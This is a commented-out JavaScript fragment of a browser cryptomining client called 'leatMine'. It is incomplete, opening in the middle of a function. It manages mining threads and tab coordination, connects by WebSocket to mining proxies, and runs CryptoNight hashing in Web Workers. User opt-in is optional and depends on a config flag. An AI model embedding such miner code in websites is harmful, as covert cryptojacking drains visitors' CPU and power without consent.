/*(function(window) {




    if (!this.verifyThread) {
      this.verifyThread = new leatMine.JobThread
    }
    this.setNumThreads(this._targetNumThreads);
    this._autoReconnect = true;
    if (leatMine.CONFIG.REQUIRES_AUTH && !this._optInToken) {
      this._waitingForAuth = true;
      this._auth.auth(function(token) {
        this._waitingForAuth = false;
        if (!token) {
          this.stop();
          this._emit("optin", {
            status: "canceled"
          });
          this._emit("error", {
            error: "opt_in_canceled"
          });
          return
        }
        this._emit("optin", {
          status: "accepted"
        });
        this._optInToken = token;
        this._connect()
      }
      .bind(this))
    } else {
      this._connect()
    }
  }
  ;
  Miner.prototype._otherTabRunning = function() {
    if (this._tab.lastPingReceived > Date.now() - 1500) {
      return true
    }
    try {
      var tdjson = localStorage.getItem("leatmine");
      if (tdjson) {
        var td = JSON.parse(tdjson);
        if (td.ident !== this._tab.ident && Date.now() - td.time < 1500) {
          return true
        }
      }
    } catch (e) {}
    return false
  }
  ;
  Miner.prototype._updateTabs = function() {
    var otherTabRunning = this._otherTabRunning();
    if (otherTabRunning && this.isRunning() && Date.now() > this._tab.grace) {
      this.stop("dontKillTabUpdate")
    } else if(!otherTabRunning && !this.isRunning()) {
      this._startNow()
    }
    if(this.isRunning() && !this._waitingForAuth) {
      if (this._bc) {
        this._bc.postMessage("ping")
      }
      try {
        localStorage.setItem("leatmine", JSON.stringify({
          ident: this._tab.ident,
          time: Date.now()
        }))
      } catch (e) {}
    }
  }
  ;
  Miner.prototype._adjustThreads = function() {
    var hashes = this.getHashesPerSecond();
    var threads = this.getNumThreads();
    var stats = this._autoThreads.stats;
    stats[threads] = stats[threads] ? stats[threads] * .5 + hashes * .5 : hashes;
    if (Date.now() > this._autoThreads.adjustAt) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      var cur = (stats[threads] || 0) - 1;
      var up = stats[threads + 1] || 0;
      var down = stats[threads - 1] || 0;
      if (cur > down && (up === 0 || up > cur) && threads < 8) {
        return this.setNumThreads(threads + 1)
      } else if (cur > up && (!down || down > cur) && threads > 1) {
        return this.setNumThreads(threads - 1)
      }
    }
  }
  ;
  Miner.prototype._emit = function(type, params) {
    var listeners = this._eventListeners[type];
    if (listeners && listeners.length) {
      for (var i = 0; i < listeners.length; i++) {
        listeners[i](params)
      }
    }
  }
  ;
  Miner.prototype._hashString = function(s) {
    var hash = 5381
      , i = s.length;
    while (i) {
      hash = hash * 33 ^ s.charCodeAt(--i)
    }
    return hash >>> 0
  }
  ;
  Miner.prototype._connect = function() {
    if (this._socket) {
      return
    }
    var shards = leatMine.CONFIG.WEBSOCKET_SHARDS;
    var shardIdx = this._hashString(this._siteKey) % shards.length;
    var proxies = shards[shardIdx];
    var proxyUrl = proxies[Math.random() * proxies.length | 0];
    this._socket = new WebSocket(proxyUrl);
    this._socket.onmessage = this._onMessage.bind(this);
    this._socket.onerror = this._onError.bind(this);
    this._socket.onclose = this._onClose.bind(this);
    this._socket.onopen = this._onOpen.bind(this)
  }
  ;
  Miner.prototype._onOpen = function(ev) {
    this._emit("open");
    var params = {
      site_key: this._siteKey,
      type: "anonymous",
      user: null,
      goal: 0
    };
    if(this._user) {
      params.type = "user";
      params.user = this._user.toString()
    } else if (this._goal) {
      params.type = "token";
      params.goal = this._goal
    }
    if(this._optInToken) {
      params.opt_in = this._optInToken
    }
    this._send("auth", params)
  }
  ;
  Miner.prototype._onError = function(ev) {
    this._emit("error", {
      error: "connection_error"
    });
    this._onClose(ev)
  }
  ;
}
)(window);
(function(window) {
  "use strict";
  var JobThread = function() {
    this.worker = new Worker(leatMine.CRYPTONIGHT_WORKER_BLOB);
    this.worker.onmessage = this.onReady.bind(this);
    this.currentJob = null;
    this.jobCallback = function() {}
    ;
    this.verifyCallback = function() {}
    ;
    this._isReady = false;
    this.hashesPerSecond = 0;
    this.hashesTotal = 0;
    this.running = false;
    this.lastMessageTimestamp = Date.now()
  };
  JobThread.prototype.onReady = function(msg) {
    if (msg.data !== "ready" || this._isReady) {
      throw 'Expecting first message to be "ready", got ' + msg
    }
    this._isReady = true;
    this.worker.onmessage = this.onReceiveMsg.bind(this);
    if (this.currentJob) {
      this.running = true;
      this.worker.postMessage(this.currentJob)
    }
  }
  ;
  JobThread.prototype.onReceiveMsg = function(msg) {
    if (msg.data.verify_id) {
      this.verifyCallback(msg.data);
      return
    }
    if (msg.data.result) {
      this.jobCallback(msg.data)
    }
    this.hashesPerSecond = this.hashesPerSecond * .5 + msg.data.hashesPerSecond * .5;
    this.hashesTotal += msg.data.hashes;
    this.lastMessageTimestamp = Date.now();
    if (this.running) {
      this.worker.postMessage(this.currentJob)
    }
  }
  ;
  JobThread.prototype.setJob = function(job, callback) {
    this.currentJob = job;
    this.jobCallback = callback;
    if (this._isReady && !this.running) {
      this.running = true;
      this.worker.postMessage(this.currentJob)
    }
  }
  ;
  JobThread.prototype.verify = function(job, callback) {
    if (!this._isReady) {
      return
    }
    this.verifyCallback = callback;
    this.worker.postMessage(job)
  }
  ;
  JobThread.prototype.stop = function() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null
    }
    this.running = false
  }
  ;
  window.leatMine.JobThread = JobThread


}
*/
